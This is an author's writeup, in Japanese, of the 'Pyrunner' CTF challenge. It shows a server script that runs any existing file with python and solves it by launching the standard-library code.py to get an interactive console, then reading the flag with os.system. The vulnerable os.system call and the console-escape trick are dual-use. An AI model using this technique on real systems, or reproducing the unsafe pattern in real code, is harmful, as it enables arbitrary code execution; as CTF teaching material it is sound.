# Author's Writeup for Pyrunner

Daily AlpacaHack B-SIDE で 4/1-3 に出題した『Pyrunner』の作問者 Writeup です。

https://alpacahack.com/daily-bside/challenges/pyrunner

## 問題概要

問題文:
> the era of [Bashrunner](https://alpacahack.com/daily/challenges/bash-runner) is over

配布ファイルを読むと、次の Python スクリプトがサーバーで実行されていることがわかります:
```python
import os

path = input("Example: hello.py\n$ python ")
if os.path.isfile(path):
    os.system(f"python {path}")
else:
    print("File not found")

```

Daily AlpacaHack で以前 Bashrunner という問題を出題しました。
Bashrunner では、任意のファイルを `bash` で実行できる問題でしたが、この Pyrunner では任意のファイルを `python` で実行できます。

## 解法

`os.path.isfile` 等のガワについては、 [BashrunnerのWriteup](../../daily-alpacahack/20260123_bash-runner/README.md) で簡単に解説しています。

この問題では、入力として与えた文字列がファイルパスであり、かつそのファイルが存在している必要があり、その条件を満たすと `python <path>` が実行されます。
したがって、ゴールは「既存のファイルのうち、`python` に渡すと任意コード実行に繋がるものを見つけること」になりそうだとわかります。

先に答えから書くと、この問題は `/usr/local/lib/python3.14/code.py` を与えると解くことができます。
具体的には次のようにフラグを取得できます:

```
Example: hello.py
$ python /usr/local/lib/python3.14/code.py
Python 3.14.3 (main, Apr  7 2026, 02:19:53) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
(InteractiveConsole)
>>> import os; os.system("cat /flag*")
Alpaca{my bank account is zero-zero-zero, oh no ;(}0
```

`code.py` は Python の標準ライブラリに含まれるモジュールです。

このファイルを `python /usr/local/lib/python3.14/code.py` のように直接実行すると、 `__name__ == "__main__"` が成り立つため、 `code.py` 末尾の `if __name__ == "__main__":` 以下が実行されます:

```python
def interact(banner=None, readfunc=None, local=None, exitmsg=None, local_exit=False):
    # (snip)
    console = InteractiveConsole(local, local_exit=local_exit)
    # (snip)
    console.interact(banner, exitmsg)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(color=True)
    parser.add_argument('-q', action='store_true',
                       help="don't print version and copyright messages")
    args = parser.parse_args()
    if args.q or sys.flags.quiet:
        banner = ''
    else:
        banner = None
    interact(banner)
```

ここでは最終的に `interact(banner)` が呼ばれます。
`interact()` は `InteractiveConsole` を作って `console.interact(...)` を呼ぶ関数なので、結果として Python の対話コンソールが起動します。

後は、 `import os; os.system("cat /flag*")` など、好きなコードを実行すればフラグを取得できます。

Flag: `Alpaca{my bank account is zero-zero-zero, oh no ;(}`
